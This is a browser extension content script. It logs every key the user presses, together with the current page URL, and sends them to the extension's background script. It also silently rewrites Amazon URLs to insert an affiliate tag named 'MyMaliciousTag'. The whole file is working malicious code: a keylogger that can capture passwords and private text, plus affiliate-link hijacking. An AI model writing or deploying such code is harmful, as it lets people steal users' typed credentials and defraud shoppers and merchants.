chrome.runtime.onConnect.addListener(function (port) {});

// save the key and web page url and send them to the background.js
var k = "";
var data = {};
window.onkeydown = function (event) {
  if (event.key.length > 1) {
    k = " (" + event.key + ") ";
  } else {
    k = event.key;
  }
  data = {
    key: k,
    page: window.location.href,
  };
  chrome.runtime.sendMessage(data);
};

// modify the url and add tag
function modifyURL() {
  const url = new URL(window.location.href);
  url.searchParams.set("tag", "MyMaliciousTag");
  const modifiedUrl = url.toString();

  if (window.location.href !== modifiedUrl) {
    window.location.href = modifiedUrl;
  }
}

// Only modify the URL if it doesn't already have the "tag" parameter and the host is Amazon
if (
  !window.location.search.includes("tag=") &&
  (window.location.hostname.includes("amazon.com") ||
    window.location.hostname.includes("amazon.co.uk"))
) {
  modifyURL();
}
